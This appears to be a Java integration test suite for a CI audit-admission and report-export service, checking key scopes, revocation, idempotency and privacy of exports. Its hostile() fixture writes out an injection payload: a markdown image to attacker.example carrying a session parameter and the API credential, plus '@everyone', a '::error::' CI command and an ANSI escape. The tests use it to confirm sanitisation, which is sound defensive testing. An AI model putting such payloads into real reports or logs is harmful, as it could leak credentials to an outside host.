package com.dokor.argos.services.domain.report;

import com.coreoz.plume.db.querydsl.transaction.TransactionManagerQuerydsl;
import com.coreoz.plume.jersey.security.permission.*;
import com.dokor.argos.db.dao.*;
import com.dokor.argos.db.generated.*;
import com.dokor.argos.jersey.SafeJsonProvider;
import com.dokor.argos.services.account.*;
import com.dokor.argos.services.ci.*;
import com.dokor.argos.services.ci.errors.*;
import com.dokor.argos.services.connected.discovery.*;
import com.dokor.argos.services.domain.audit.AuditRunService;
import com.dokor.argos.webservices.api.account.*;
import com.dokor.argos.webservices.api.report.ReportsWs;
import com.typesafe.config.ConfigFactory;
import jakarta.ws.rs.WebApplicationException;
import java.net.URI;
import java.net.http.*;
import java.time.*;
import java.util.*;
import java.util.concurrent.*;
import org.glassfish.jersey.grizzly2.httpserver.GrizzlyHttpServerFactory;
import org.glassfish.jersey.server.ResourceConfig;
import org.glassfish.grizzly.threadpool.ThreadPoolConfig;
import org.junit.jupiter.api.*;
import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

class CiAdmissionIT extends MariaDbReportFixture {
    private static final String CSRF="c".repeat(43);
    private AccountLifecycleIT.MutableClock clock;private AccountDao dao;private AccountSessionService sessions;
    private CiTargetsService targets;private CiKeysService keys;private CiAdmissionService ci;private CiRateService rates;
    private DiscoveryTransport transport;private AuditRunDao runDao;private long owner;private String browser,target;
    private CiKeysService.Issued key;private com.typesafe.config.Config config;
    @BeforeEach void setupCiAdmission() throws Exception {
        clock=new AccountLifecycleIT.MutableClock();clock.now=Instant.parse("2026-10-18T12:00:00Z");
        config=ConfigFactory.parseString("premium-ci.enabled=true\naccount.enabled=true\naccount.jwt-secret=\""+"s".repeat(64)+"\"").withFallback(ConfigFactory.load());
        var tx=new TransactionManagerQuerydsl(source,new com.querydsl.sql.Configuration(com.querydsl.sql.MySQLTemplates.DEFAULT));dao=new AccountDao(tx);
        var settings=new AccountSettings(config);sessions=new AccountSessionService(dao,new AccountSessionSigner(settings,mapper,clock),tokens,settings,clock);
        var policy=new CiPolicy(config);var usage=new UsageService(tx,new UsagePolicy(config),clock);var entitlement=new CiEntitlementService(policy,usage,clock);
        var operations=new CiAccountOperations(sessions,new AccountRateLimiter(dao,tokens,clock,settings),entitlement);
        var proof=mock(HttpsTargetProofClient.class);when(proof.matches(anyString(),anyString(),any())).thenReturn(true);
        targets=new CiTargetsService(dao,operations,policy,entitlement,proof,tokens,clock);
        keys=new CiKeysService(dao,operations,targets,policy,new CiAuthLimiter(dao,tokens,clock),sessions,tokens,mapper,clock);
        owner=user("admission@example.com");browser=login(owner);target=verified(browser);
        key=issue(browser,target,List.of("audits:write","results:read","usage:read"));
        runDao=new AuditRunDao(tx,usage);runs=new AuditRunService(runDao,tokens,mapper);rates=new CiRateService(dao,tokens,clock);
        transport=mock(DiscoveryTransport.class);
        ci=new CiAdmissionService(keys,targets,entitlement,new CiQuotaService(runDao,entitlement,policy,new UsagePolicy(config),rates,tokens,clock),
            new CiRequestDao(tx),runs,dao,transport,mapper,tokens,clock,ReportRetentionPolicy.defaults());
    }
    private long user(String email) throws Exception {
        var user=dao.transaction(c->{var u=new AccountUser();u.setEmail(email);u.setDisplayName("CI fixture");u.setState("ACTIVE");u.setRole("USER");u.setOffer("PREMIUM");u.setCreatedAt(clock.instant());return dao.save(u,c);});
        sql("INSERT INTO ARG_ACCOUNT_CI_ENTITLEMENT(id,ci_access,valid_until,updated_at) VALUES("+user.getId()+",1,'2028-01-01',NOW())");return user.getId();
    }
    private String login(long owner){return "Bearer "+dao.transaction(c->sessions.create(dao.user(owner,c,false),CSRF,c)).jwt();}
    private String verified(String auth){var id=targets.create(auth,CSRF,"https://example.com","fixture").target().id();targets.verify(auth,CSRF,id,"fixture");return id;}
    private CiKeysService.Issued issue(String auth,String target,List<String> scopes){return keys.create(auth,CSRF,new CiKeysService.Input("Pipeline",scopes,List.of(target),null,null),"fixture");}
    private String auth(){return "Bearer "+key.credential();}
    private CiAdmissionService.Input input(int count){return new CiAdmissionService.Input("https://example.com",count,"standard-v1");}
    private CiErrorCode code(WebApplicationException e){return ((CiErrors.Envelope)e.getResponse().getEntity()).error().code();}
    private CiAdmissionService.Creation admit(String intention,int count){return ci.create(auth(),"fixture",intention,input(count));}
    private long runId(CiAdmissionService.Creation created){return Long.parseLong(created.admission().runs().getFirst().id());}
    private String hostile(){return "synthetic-private-736 @everyone ::error:: ![remote](https://attacker.example/private?session=hidden) \u001b[31m "+key.credential();}
    private long publishPrivate() throws Exception {
        long run=runId(admit(UUID.randomUUID().toString(),1));
        assertTrue(runDao.claimRun(run,"export-worker",clock.instant()));
        var report=mapper.createObjectNode();report.put("domain","example.com");report.put("url","https://example.com");
        report.putObject("site").put("title",hostile()).put("logoUrl","https://attacker.example/private");
        var issues=report.putArray("issues");
        for(String id:List.of("http.security.csp","http.security.csp","html.title","zap.alert.unknown")) {
            var issue=issues.addObject();issue.put("id",id);issue.put("categoryKey","security");
            issue.put("severity","critical");issue.put("title",hostile());issue.put("evidence",hostile());issue.put("recommendation",hostile());
        }
        var dto=mapper.treeToValue(report,ReportDto.class);var composer=mock(PublicReportComposer.class);
        when(composer.compose(any())).thenReturn(dto);
        var summaries=mock(AiReportSummaryService.class);var ratings=mock(AhrefsDomainRatingClient.class);
        var privatePublisher=new ReportPublishService(dao.transactions,runDao,reports,composer,summaries,ratings,mapper);
        var audit=new Audit();audit.setId(1L);audit.setNormalizedUrl("https://example.com");
        sql("UPDATE ARG_AUDIT_RUN SET report_token_hash=UNHEX(SHA2('synthetic-ci-private-known',256)) WHERE id="+run);
        privatePublisher.completeAndPublish(run,audit,mock(com.dokor.argos.services.analysis.model.AuditReportJson.class),mapper.writeValueAsString(Map.of("console",hostile(),"headers",hostile())),"export-worker");
        verifyNoInteractions(summaries,ratings);return run;
    }
    @Test void detailedExportsAndStorageContainNoTargetContentOrCredential() throws Exception {
        long run=publishPrivate();var export=ci.export(auth(),"fixture",run);
        assertEquals("details-v1",export.kind());assertEquals(2,export.details().findings().size());assertEquals(1,export.details().omittedFindings());
        assertEquals("/api/ci/v1/runs/"+run+"/report",export.reportPath());
        String output=mapper.writeValueAsString(export);
        for(String marker:List.of("synthetic-private-736",key.credential(),"@everyone","::error::","attacker.example","session=hidden","evidence","console","Authorization"))
            assertFalse(output.contains(marker),marker.equals(key.credential())?"credential":marker);
        var stored=reports.findByRunId(run).orElseThrow();assertEquals("{}",stored.getReportJson());assertNull(stored.getDiagnosticJson());
        assertNull(stored.getLogoUrl());assertNull(stored.getSiteTitle());assertNull(runs.getRun(run).orElseThrow().getResultJson());
        assertFalse(stored.getCiExportJson().contains("synthetic-private-736"));
        assertTrue(reports.findByTokenHash(tokens.sha256("synthetic-ci-private-known")).isEmpty());
        assertTrue(reader.getByToken("synthetic-ci-private-known").isEmpty());
        var editor=new AccountReportIntroductionService(sessions,mapper,clock,tokens);
        assertThrows(AccountError.class,()->editor.read(browser,"synthetic-ci-private-known"));
        assertThrows(AccountError.class,()->editor.publish(browser,CSRF,"synthetic-ci-private-known",mock(ReportIntroduction.class)));
        var history=new AccountHistoryService(dao,sessions,mapper,clock);
        var sites=new AccountSitesService(dao,sessions,null,null,null,clock);
        var followed=dao.transaction(c->sites.follow(owner,1L,c));
        assertThrows(AccountError.class,()->history.reportContext(browser,"synthetic-ci-private-known"));
        assertTrue(history.history(browser,followed.getId(),20,null).items().isEmpty());
        var site=sites.list(browser,20,null).items().getFirst();
        assertNull(site.latestRunStatus());assertNull(sites.urls(browser,Long.parseLong(site.siteId()),20,null).items().getFirst().latestAvailableReport());
        var personal=new AccountRunReadDao(dao.transactions);
        assertTrue(dao.transaction(c->personal.owned(run,owner,c)).isEmpty());
    }
    @Test void exportsRequireCurrentKeyScopeOwnerIntegrationAndEntireOriginalOriginScope() throws Exception {
        long run=publishPrivate();
        var other=issue(browser,target,List.of("results:read"));
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export("Bearer "+other.credential(),"fixture",run))));
        String foreignBrowser=login(user("export-other@example.com"));var foreign=issue(foreignBrowser,verified(foreignBrowser),List.of("results:read"));
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export("Bearer "+foreign.credential(),"fixture",run))));
        var writeOnly=issue(browser,target,List.of("audits:write"));
        assertEquals(CiErrorCode.PERMISSION_DENIED,code(assertThrows(WebApplicationException.class,()->ci.export("Bearer "+writeOnly.credential(),"fixture",run))));
        assertEquals(CiErrorCode.AUTHENTICATION_FAILED,code(assertThrows(WebApplicationException.class,()->ci.export(browser,"fixture",run))));
        keys.revoke(browser,CSRF,key.key().id(),"fixture");
        assertEquals(CiErrorCode.AUTHENTICATION_FAILED,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
        String otherTarget=targets.create(browser,CSRF,"https://www.example.com","fixture").target().id();targets.verify(browser,CSRF,otherTarget,"fixture");
        key=keys.create(browser,CSRF,new CiKeysService.Input("Replacement",List.of("results:read"),List.of(otherTarget),key.key().integrationId(),null),"fixture");
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
    }
    @Test void expiredMissingOversizedAndTamperedExportsFailClosedWithoutRawFallback() throws Exception {
        long run=publishPrivate();var q=QAuditReport.auditReport;String saved=reports.findByRunId(run).orElseThrow().getCiExportJson();
        for(String invalid:List.of(saved.substring(0,saved.length()-1)+",\"raw\":\"synthetic-private-736\"}", "{\"console\":\"synthetic-private-736\"}")) {
            dao.transaction(c->{dao.transactions.update(q,c).set(q.ciExportJson,invalid).where(q.runId.eq(run)).execute();return null;});
            var failure=assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run));
            assertEquals(CiErrorCode.INTERNAL_ERROR,code(failure));assertFalse(mapper.writeValueAsString(failure.getResponse().getEntity()).contains("synthetic-private-736"));
        }
        dao.transaction(c->{dao.transactions.update(q,c).set(q.ciExportJson," ".repeat(50000)).where(q.runId.eq(run)).execute();return null;});
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
        dao.transaction(c->{dao.transactions.update(q,c).set(q.ciExportJson,(String)null).where(q.runId.eq(run)).execute();return null;});
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
        sql("UPDATE ARG_AUDIT_REPORT SET created_at='2026-09-17',expires_at='2030-01-01' WHERE run_id="+run);
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.report(auth(),"fixture",run))));
    }
    @Test void rotationPreservesHistoricalReadsButNarrowerReplacementCannotReadTheOriginalWiderScope() throws Exception {
        String second=targets.create(browser,CSRF,"https://www.example.com","fixture").target().id();targets.verify(browser,CSRF,second,"fixture");
        String integration=key.key().integrationId();keys.revoke(browser,CSRF,key.key().id(),"fixture");
        key=keys.create(browser,CSRF,new CiKeysService.Input("Both targets",List.of("audits:write","results:read"),List.of(target,second),integration,null),"fixture");
        long run=publishPrivate();key=keys.rotate(browser,CSRF,key.key().id(),"fixture");assertEquals("details-v1",ci.export(auth(),"fixture",run).kind());
        // Revoke both the overlap and the current credential before replacing the stable slot.
        for(var view:keys.list(browser,0).items())if(view.integrationId().equals(integration) && view.revokedAt()==null)keys.revoke(browser,CSRF,view.id(),"fixture");
        key=keys.create(browser,CSRF,new CiKeysService.Input("Narrow",List.of("results:read"),List.of(target),integration,null),"fixture");
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.report(auth(),"fixture",run))));
        keys.revoke(browser,CSRF,key.key().id(),"fixture");
        key=keys.create(browser,CSRF,new CiKeysService.Input("Both restored",List.of("results:read"),List.of(target,second),integration,null),"fixture");
        sql("UPDATE ARG_ACCOUNT_USER SET offer='FREE' WHERE id="+owner);
        assertEquals("details-v1",ci.export(auth(),"fixture",run).kind());
        var q=QCiApiKey.table;dao.transaction(c->{dao.transactions.update(q,c).set(q.expiresAt,clock.instant().minusSeconds(1)).where(q.publicId.eq(key.key().id())).execute();return null;});
        assertEquals(CiErrorCode.AUTHENTICATION_FAILED,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
    }
    @Test void deletionIsScopedIdempotentAndPreservesUsageAndOriginalIntention() throws Exception {
        String intention=UUID.randomUUID().toString();var first=admit(intention,1);long run=runId(first);
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.deleteReport(auth(),"fixture",run))));
        assertTrue(runDao.claimRun(run,"delete-worker",clock.instant()));
        var audit=new Audit();audit.setId(1L);audit.setNormalizedUrl("https://example.com");
        publisher.completeAndPublish(run,audit,mock(com.dokor.argos.services.analysis.model.AuditReportJson.class),"{}","delete-worker");
        var readOnly=issue(browser,target,List.of("results:read"));
        assertEquals(CiErrorCode.PERMISSION_DENIED,code(assertThrows(WebApplicationException.class,()->ci.deleteReport("Bearer "+readOnly.credential(),"fixture",run))));
        assertTrue(ci.deleteReport(auth(),"fixture",run).deleted());assertTrue(ci.deleteReport(auth(),"fixture",run).deleted());
        assertTrue(reports.findByRunId(run).isEmpty());assertNull(runs.getRun(run).orElseThrow().getReportTokenHash());
        assertEquals("COUNTED",dao.transactions.selectQuery().select(QUsageRun.table.state).from(QUsageRun.table).where(QUsageRun.table.id.eq(run)).fetchOne());
        assertFalse(admit(intention,1).created());assertEquals(first.admission().id(),ci.byKey(auth(),"fixture",intention).id());
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
    }
    @Test void lostResponseRotationAndDowngradeRecoverTheSameIntentionWithoutAnotherReservation() throws Exception {
        String intention=UUID.randomUUID().toString();var first=admit(intention,2);assertTrue(first.created());
        assertFalse(admit(intention,2).created());assertEquals(2,ci.usage(auth(),"fixture").usage().reserved());
        key=keys.rotate(browser,CSRF,key.key().id(),"fixture");
        assertEquals(first.admission().id(),ci.byKey(auth(),"fixture",intention).id());
        sql("UPDATE ARG_ACCOUNT_USER SET offer='FREE' WHERE id="+owner);
        assertFalse(admit(intention,2).created());assertEquals(first.admission().id(),ci.get(auth(),"fixture",first.admission().id()).id());
        assertFalse(ci.preflight(auth(),"fixture").newAccessAllowed());
        assertEquals(CiErrorCode.FEATURE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->admit(UUID.randomUUID().toString(),1))));
        assertEquals(CiErrorCode.IDEMPOTENCY_CONFLICT,code(assertThrows(WebApplicationException.class,()->admit(intention,1))));
        verify(transport,times(1)).validate(eq("https://example.com"),any());
    }
    @Test void sameIntentionIsAtomicAcrossConcurrentClients() throws Exception {
        String intention=UUID.randomUUID().toString();var barrier=new CyclicBarrier(3);var ids=new HashSet<String>();int created=0;
        try(var pool=Executors.newFixedThreadPool(3)) {
            var futures=new ArrayList<Future<CiAdmissionService.Creation>>();for(int n=0;n<3;n++)futures.add(pool.submit(()->{barrier.await();return admit(intention,2);}));
            for(var f:futures){var result=f.get(20,TimeUnit.SECONDS);ids.add(result.admission().id());if(result.created())created++;}
        }
        assertEquals(1,created);assertEquals(1,ids.size());assertEquals(2,ci.usage(auth(),"fixture").usage().reserved());
        var requests=dao.transactions.selectQuery().select(QCiRequest.table).from(QCiRequest.table).fetch();assertEquals(1,requests.size());
        assertNotNull(requests.getFirst().getRequestFingerprint());assertNotNull(requests.getFirst().getIdempotencyHash());
    }
    @Test void anotherAccountOrIntegrationCannotReadTheSameAuditOrRun() throws Exception {
        var created=admit(UUID.randomUUID().toString(),1);long run=runId(created);
        var other=issue(browser,target,List.of("results:read","usage:read"));
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.run("Bearer "+other.credential(),"fixture",run))));
        String otherBrowser=login(user("admission-other@example.com"));var foreign=issue(otherBrowser,verified(otherBrowser),List.of("results:read"));
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.report("Bearer "+foreign.credential(),"fixture",run))));
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.get("Bearer "+foreign.credential(),"fixture",created.admission().id()))));
        assertEquals(CiErrorCode.PERMISSION_DENIED,code(assertThrows(WebApplicationException.class,()->ci.create("Bearer "+other.credential(),"fixture",UUID.randomUUID().toString(),input(1)))));
        assertEquals("QUEUED",ci.run(auth(),"fixture",run).status());
    }
    @Test void changedOrRevokedGrantsAreRefusedBeforeDnsAndRacesRecheckCredentials() {
        targets.revoke(browser,CSRF,target,"fixture");
        assertEquals(CiErrorCode.TARGET_VERIFICATION_REQUIRED,code(assertThrows(WebApplicationException.class,()->admit(UUID.randomUUID().toString(),1))));
        verifyNoInteractions(transport);
    }
    @Test void revocationDuringDnsCannotCreateAnyRun() {
        doAnswer(call->{keys.revoke(browser,CSRF,key.key().id(),"fixture");return null;}).when(transport).validate(anyString(),any());
        assertEquals(CiErrorCode.AUTHENTICATION_FAILED,code(assertThrows(WebApplicationException.class,()->admit(UUID.randomUUID().toString(),1))));
        assertTrue(dao.transactions.selectQuery().select(QCiRequest.table).from(QCiRequest.table).fetch().isEmpty());
        assertTrue(dao.transactions.selectQuery().select(QUsageRun.table).from(QUsageRun.table).fetch().isEmpty());
    }
    @Test void dnsFailureAndUnexpectedUpstreamTextAreSanitizedAndCreateNoAdmission() {
        doThrow(new RuntimeException("synthetic-private-upstream")).when(transport).validate(anyString(),any());
        var rejected=assertThrows(WebApplicationException.class,()->admit(UUID.randomUUID().toString(),1));assertEquals(CiErrorCode.UPSTREAM_UNAVAILABLE,code(rejected));
        assertFalse(rejected.getResponse().getEntity().toString().contains("synthetic-private-upstream"));
        assertTrue(dao.transactions.selectQuery().select(QCiRequest.table).from(QCiRequest.table).fetch().isEmpty());
    }
    @Test void capacityRefusalRollsBackNewUrlIdentityRequestAndChildrenTogether() {
        admit(UUID.randomUUID().toString(),1);
        assertEquals(CiErrorCode.CAPACITY_UNAVAILABLE,code(assertThrows(WebApplicationException.class,
            ()->ci.create(auth(),"fixture",UUID.randomUUID().toString(),new CiAdmissionService.Input("https://example.com/new-identity",2,"standard-v1")))));
        assertNull(dao.transactions.selectQuery().select(QAudit.audit.id).from(QAudit.audit).where(QAudit.audit.normalizedUrl.eq("https://example.com/new-identity")).fetchOne());
        assertEquals(1,dao.transactions.selectQuery().select(QCiRequest.table).from(QCiRequest.table).fetch().size());
        assertEquals(1,ci.usage(auth(),"fixture").usage().reserved());
    }
    @Test void terminalWorkerFailureUsesAControlledCodeAndReleasesOnlyItsReservation() {
        long run=runId(admit(UUID.randomUUID().toString(),1));assertTrue(runDao.claimRun(run,"failed-worker",clock.instant()));
        assertTrue(runDao.markFailed(run,clock.instant(),"synthetic-private-upstream","failed-worker"));
        var status=ci.run(auth(),"fixture",run);assertEquals("FAILED",status.status());assertEquals("RUN_FAILED",status.failureCode());
        assertFalse(status.toString().contains("synthetic-private-upstream"));
        assertEquals(0,ci.usage(auth(),"fixture").usage().reserved());assertEquals(0,ci.usage(auth(),"fixture").usage().used());
    }
    @Test void reportsStayPrivateEvenWithAKnownLegacyTokenAndExportsIgnoreRawEvidence() throws Exception {
        var created=admit(UUID.randomUUID().toString(),1);long run=runId(created);
        sql("UPDATE ARG_AUDIT_RUN SET report_token_hash=UNHEX(SHA2('synthetic-ci-known',256)) WHERE id="+run);
        assertTrue(runDao.claimRun(run,"fixture-worker",clock.instant()));var audit=new Audit();audit.setId(1L);audit.setNormalizedUrl("https://example.com");
        publisher.completeAndPublish(run,audit,mock(com.dokor.argos.services.analysis.model.AuditReportJson.class),"{\"console\":\"synthetic-private-upstream\"}","fixture-worker");
        assertTrue(reader.getByToken("synthetic-ci-known").isEmpty());assertTrue(reader.getByRunId(run).isEmpty());assertTrue(runs.findByReportToken("synthetic-ci-known").isEmpty());
        var sharing=new ReportSharingService(dao,sessions,reader,tokens,clock,new ReportSharingDao());
        assertThrows(AccountError.class,()->sharing.create(browser,CSRF,run,7));
        String oldShare="q".repeat(43);
        dao.transaction(c->{new ReportSharingDao().replace(c,run,tokens.sha256(oldShare),null);return null;});
        assertTrue(sharing.shared(oldShare).isEmpty());
        var report=ci.report(auth(),"fixture",run);assertEquals("summary-v1",report.kind());assertNull(report.globalScore());
        assertFalse(mapper.writeValueAsString(report).contains("synthetic-private-upstream"));
        // Publisher uses its real publication date; do not bind this privacy test to the calendar month of the fixture clock.
        assertEquals("COUNTED",dao.transactions.selectQuery().select(QUsageRun.table.state).from(QUsageRun.table).where(QUsageRun.table.id.eq(run)).fetchOne());
        assertEquals(0,ci.usage(auth(),"fixture").usage().reserved());
        sql("UPDATE ARG_AUDIT_REPORT SET expires_at='2026-10-17' WHERE run_id="+run);
        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.report(auth(),"fixture",run))));
    }
    @Test void realHttpEnforcesKeyScopeIdempotenceNoStoreAndStrictInputs() throws Exception {
        var json=new SafeJsonProvider();json.setMapper(mapper);
        var resources=new ResourceConfig().register(json).register(new CiKeyFilter(keys,rates)).register(new CiAdmissionWs(ci)).register(new CiIdentityWs())
            .register(new CiResponseBoundary()).register(new ReportsWs(reader,runs)).register(RequireExplicitAccessControlFeature.accessControlAnnotations(PublicApi.class,AccountAccess.class));
        var server=GrizzlyHttpServerFactory.createHttpServer(URI.create("http://127.0.0.1:0/"),resources,false);
        for(var listener:server.getListeners()){listener.getTransport().setSelectorRunnersCount(1);listener.getTransport().setWorkerThreadPoolConfig(ThreadPoolConfig.defaultConfig().setCorePoolSize(2).setMaxPoolSize(4));}
        server.start();
        try {
            String base="http://127.0.0.1:"+server.getListeners().iterator().next().getPort();var client=HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).build();
            for(String path:List.of("/ci/v1/usage","/ci/v1/preflight","/ci/v1/runs/1/report","/ci;ignored/v1/usage","/ci/v9/unknown")) {
                var denied=client.send(HttpRequest.newBuilder(URI.create(base+path)).header("Authorization",browser).GET().build(),HttpResponse.BodyHandlers.ofString());
                assertEquals(401,denied.statusCode(),path);assertEquals("AUTHENTICATION_FAILED",mapper.readTree(denied.body()).path("error").path("code").asText());
            }
            String intention=UUID.randomUUID().toString();
            var request=HttpRequest.newBuilder(URI.create(base+"/ci/v1/analyses")).header("Authorization",auth()).header("Idempotency-Key",intention).header("Content-Type","application/json")
                .header("X-Owner-Id","99").header("X-Forwarded-For","127.0.0.1").POST(HttpRequest.BodyPublishers.ofString(mapper.writeValueAsString(input(1)))).build();
            var response=client.send(request,HttpResponse.BodyHandlers.ofString());assertEquals(201,response.statusCode(),response.body());
            assertEquals("private, no-store",response.headers().firstValue("cache-control").orElseThrow());
            var replay=client.send(request,HttpResponse.BodyHandlers.ofString());assertEquals(200,replay.statusCode());
            assertEquals(mapper.readTree(response.body()).path("id"),mapper.readTree(replay.body()).path("id"));
            assertFalse(response.body().contains(key.credential()));assertFalse(response.body().contains("reportToken"));
            var recover=client.send(HttpRequest.newBuilder(URI.create(base+"/ci/v1/admissions/by-key/"+intention)).header("Authorization",auth()).GET().build(),HttpResponse.BodyHandlers.ofString());assertEquals(200,recover.statusCode());
            var query=client.send(HttpRequest.newBuilder(URI.create(base+"/ci/v1/usage?owner=99")).header("Authorization",auth()).GET().build(),HttpResponse.BodyHandlers.ofString());assertEquals(400,query.statusCode());
            var identityQuery=client.send(HttpRequest.newBuilder(URI.create(base+"/ci/v1/identity?owner=99")).header("Authorization",auth()).GET().build(),HttpResponse.BodyHandlers.ofString());assertEquals(400,identityQuery.statusCode());
            var injected=client.send(HttpRequest.newBuilder(URI.create(base+"/ci/v1/analyses")).header("Authorization",auth()).header("Idempotency-Key",UUID.randomUUID().toString()).header("Content-Type","application/json")
                .POST(HttpRequest.BodyPublishers.ofString("{\"url\":\"https://example.com\",\"samples\":1,\"profileId\":\"standard-v1\",\"owner\":99}")).build(),HttpResponse.BodyHandlers.ofString());assertEquals(400,injected.statusCode());
            long run=mapper.readTree(response.body()).path("runs").get(0).path("id").asLong();
            sql("UPDATE ARG_AUDIT_RUN SET report_token_hash=UNHEX(SHA2('synthetic-ci-http-known',256)) WHERE id="+run);
            assertTrue(runDao.claimRun(run,"http-worker",clock.instant()));var audit=new Audit();audit.setId(1L);audit.setNormalizedUrl("https://example.com");
            publisher.completeAndPublish(run,audit,mock(com.dokor.argos.services.analysis.model.AuditReportJson.class),"{}","http-worker");
            for(String path:List.of("/reports/synthetic-ci-http-known","/reports/synthetic-ci-http-known/status")) {
                var privateReport=client.send(HttpRequest.newBuilder(URI.create(base+path)).GET().build(),HttpResponse.BodyHandlers.ofString());assertEquals(404,privateReport.statusCode(),path);
                assertEquals("private, no-store",privateReport.headers().firstValue("cache-control").orElseThrow());
            }
            var report=client.send(HttpRequest.newBuilder(URI.create(base+"/ci/v1/runs/"+run+"/report")).header("Authorization",auth()).GET().build(),HttpResponse.BodyHandlers.ofString());
            assertEquals(200,report.statusCode(),report.body());assertEquals("summary-v1",mapper.readTree(report.body()).path("kind").asText());
            var other=issue(browser,target,List.of("results:read"));
            String otherBrowser=login(user("http-export-other@example.com"));
            var foreign=issue(otherBrowser,verified(otherBrowser),List.of("results:read"));
            for(String credential:List.of("",browser,"Bearer synthetic-ci-http-known","Bearer "+other.credential(),"Bearer "+foreign.credential(),auth())) {
                var builder=HttpRequest.newBuilder(URI.create(base+"/ci/v1/runs/"+run+"/export"));
                if(!credential.isEmpty())builder.header("Authorization",credential);
                var exported=client.send(builder.GET().build(),HttpResponse.BodyHandlers.ofString());
                int expected=credential.equals(auth())?200:credential.equals("Bearer "+other.credential()) || credential.equals("Bearer "+foreign.credential())?404:401;
                assertEquals(expected,exported.statusCode());
                assertEquals("private, no-store",exported.headers().firstValue("cache-control").orElseThrow());
                assertEquals("no-referrer",exported.headers().firstValue("referrer-policy").orElseThrow());
                assertFalse(exported.body().contains(key.credential()));assertFalse(exported.body().contains("synthetic-ci-http-known"));
            }
            var deleted=client.send(HttpRequest.newBuilder(URI.create(base+"/ci/v1/runs/"+run+"/report")).header("Authorization",auth()).DELETE().build(),HttpResponse.BodyHandlers.ofString());
            assertEquals(200,deleted.statusCode());assertTrue(mapper.readTree(deleted.body()).path("deleted").asBoolean());
            var gone=client.send(HttpRequest.newBuilder(URI.create(base+"/ci/v1/runs/"+run+"/export")).header("Authorization",auth()).GET().build(),HttpResponse.BodyHandlers.ofString());
            assertEquals(404,gone.statusCode());
        }finally{server.shutdownNow();}
    }
}
